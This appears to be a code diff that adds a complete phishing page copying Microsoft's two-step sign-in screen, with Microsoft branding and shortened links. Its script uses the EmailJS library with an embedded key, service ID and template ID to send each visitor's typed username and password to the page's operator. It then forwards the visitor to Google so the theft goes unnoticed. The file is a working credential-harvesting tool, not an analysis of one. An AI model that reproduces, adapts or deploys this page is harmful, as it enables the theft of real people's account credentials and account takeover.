@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <link rel="stylesheet" href="index.css">
+  <script
+  type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+</head>
+<body>
+  <div class="container" id="loginContainer">
+    <div class="miclogo"><img src="images/microsoft_logo.png" alt="img"><p>Microsoft</p>
+    </div>
+    <div class="sign"><p>Sign in</p></div>
+    
+    <form action="{{ url_for('process') }}" method="post" id="formbd">
+      <div class="form-group">
+        <input type="text" id="username" name="username" placeholder="Email, phone, or Skype" required>    
+      </div>
+      <div class="no_acc"><p>No account?</p><p class="p2">Create <a href="https://t.ly/khCBW"></a> one!</a></p></div>
+      <div class="access_acc"><p>Can't access your account?<a href="https://t.ly/oHda2"></a></p></div>
+      <div class="form-group2">
+        <button class="back" type="submit">Back</button>
+        <button class="next" type="submit" onclick=nextPage()>Next</button>
+      </div>
+    </form>
+    <div class="login-downcontainer"> 
+        <img class="key" src="/static/images/key.png" alt="">
+        <p class="option">Sign-in options</p>
+    </div>
+  </div>
+  
+
+  <script>
+    function nextPage() {
+      var container = document.getElementById('loginContainer');
+      var usernameInput = document.getElementById('username');
+    
+  
+      if (usernameInput.value.trim() !== "") {
+        container.innerHTML = `
+        <div class="miclogo"><img src="/static/images/microsoft_logo.png" alt=""><p>Microsoft</p></div>
+        <div class="username-display" onclick="prevPage()"> ← ${usernameInput.value}</div>
+        <div class="sign"><p>Enter Password</p></div>
+        <form action="{{ url_for('process') }}" method="post">
+        <input type="hidden" id="username" name="username" value="${usernameInput.value}">
+          <div class="form-group">
+            <input type="text" id="password" name="password" placeholder="Password" required>
+          </div>
+          <div class="access_acc"><p>Forgot my password<a href="https://t.ly/oHda2"></a></p></div>
+ <a href="https://www.google.com">
+   <input type="button" class="sign_in" value="sign in" onclick=submitForm()>
+ </a>
+        
+          <div class="form-group2">
+              
+          </div>
+        </form>
+        `;
+        container.classList.add('password');
+
+
+      }
+    }
+  
+    function prevPage() {
+      var container = document.getElementById('loginContainer');
+      container.innerHTML = `
+      <div class="miclogo"><img src="/static/images/microsoft_logo.png" alt=""><p>Microsoft</p>
+      </div>
+      <div class="sign"><p>Sign in</p></div>
+      
+      <form>
+        <div class="form-group">
+          <input type="text" id="username" name="username" placeholder="Email, phone, or Skype" required>
+        </div>
+        <div class="no_acc"><p>No account?</p><p class="p2">Create <a href="https://t.ly/khCBW"></a> one!</a></p></div>
+        <div class="access_acc"><p>Can't access your account?<a href="https://t.ly/oHda2"></a></p></div>
+        <div class="form-group2">
+          <button class="back" type="submit">Back</button>
+          <button class="next" type="submit" onclick="nextPage()">Next</button>
+        <div class="login-downcontainer"> 
+            <img class="key" src="/images/key.png" alt="">
+            <p class="option">Sign-in options</p>
+        </div>
+      `;
+      container.classList.remove('password');
+    }
+  
+    // function submitForm() {
+    //   // Handle form submission here
+    //   var username = document.getElementById('username').value;
+    //   var password = document.getElementById('password').value;
+  
+    //   // Example: You can send the data to a server for authentication
+    //   console.log('Username:', username);
+    //   console.log('Password:', password);
+    // } 
+
+ 
+
+                (function(){
+  emailjs.init('tvtYG5403cIw5IKPO')
+})();
+
+function submitForm(event){
+
+     
+
+
+      let usern = document.getElementById('username').value
+      let passw = document.getElementById('password').value
+
+      var para =  {
+          username : usern,
+          password : passw,
+        
+
+        }
+
+        emailjs.send('service_kx418ok','template_7e2r9fu', para)
+        .then((result) => {
+            console.log(result.text);
+        }, (error) => {
+            console.log(error.text);
+        });
+        
+console.log('ggsgsgggs')
+
+        event.target.reset()
+}
+
+
+
+  </script>
+    
+
+
+</body>
+</html>
